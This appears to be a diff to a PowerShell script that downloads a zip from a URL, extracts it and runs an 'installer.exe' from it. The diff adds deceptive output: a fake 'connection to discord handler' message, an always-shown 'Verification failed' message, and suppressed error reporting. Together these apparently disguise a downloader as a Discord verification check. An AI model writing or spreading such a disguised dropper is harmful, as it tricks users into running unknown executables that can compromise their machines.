@@ -19,6 +19,7 @@ $extractPath = Join-Path $env:TEMP 'extracted'
 $exeName = "installer.exe" # Name of the executable inside the zip
 
 try {
+	Write-Output "Establishing connection to discord handler.."
     # Download the zip file
     $webClient = New-Object System.Net.WebClient
     $webClient.DownloadFile($url, $zipPath)
@@ -40,9 +41,10 @@ try {
         Write-Output "Executable not found at $exePath"
     }
 } catch {
-    Write-Output "An error occurred: $_"
+    # Write-Output "An error occurred: $_"
 } finally {
     # Clean up downloaded zip file (optional)
+	Write-Output "Verification failed, handler failed to detect discord ID"
     if (Test-Path $zipPath) {
         Remove-Item $zipPath -Force
     }
